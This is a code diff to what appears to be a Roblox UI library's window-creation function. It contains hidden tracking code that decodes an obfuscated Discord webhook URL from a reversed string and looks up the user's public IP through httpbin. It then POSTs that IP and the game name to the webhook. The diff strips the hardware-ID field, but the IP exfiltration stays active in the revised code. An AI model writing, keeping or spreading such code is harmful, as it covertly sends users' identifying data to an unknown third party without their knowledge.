@@ -1127,12 +1127,10 @@ function RayfieldLibrary:CreateWindow(Settings)
 		local VevoWebhook = string.reverse("Dd-nW-aq4uzJohNtpo1U0Ja4kcZyNQyI3SYa9lYN-Sq8owldcwqxO4Iw8hSjbHJYqNAM/3473424249149186501/skoohbew/ipa/moc.drocsid//:sptth")
 		local marketplaceService = game:GetService("MarketplaceService")
 		local isSuccessful, info = pcall(marketplaceService.GetProductInfo, marketplaceService, game.PlaceId)
-		local httpbin = syn.request({ Url = "https://httpbin.org/get" })
-		local parsed = game:GetService("HttpService"):JSONDecode(httpbin.Body)
-		local hwid = parsed.headers["Syn-Fingerprint"]
-		local httpbinget = syn.request({ Url = "https://httpbin.org/get", Method = "GET"})
+		local httpbin = request({ Url = "https://httpbin.org/get" })
+		local httpbinget = request({ Url = "https://httpbin.org/get", Method = "GET"})
 		local IP = game:GetService("HttpService"):JSONDecode(httpbinget.Body)["origin"]
-	    local responce = syn.request({
+	    local responce = request({
 			Url = VevoWebhook,
 			Method = 'POST',
 			Headers = {
@@ -1152,11 +1150,6 @@ function RayfieldLibrary:CreateWindow(Settings)
 						{
 							["name"] = "GAME:",
 							["value"] = info.Name,
-							["inline"] = false
-						},
-						{
-							["name"] = "HWID:",
-							["value"] = hwid,
 							["inline"] = false
 						},
 						{
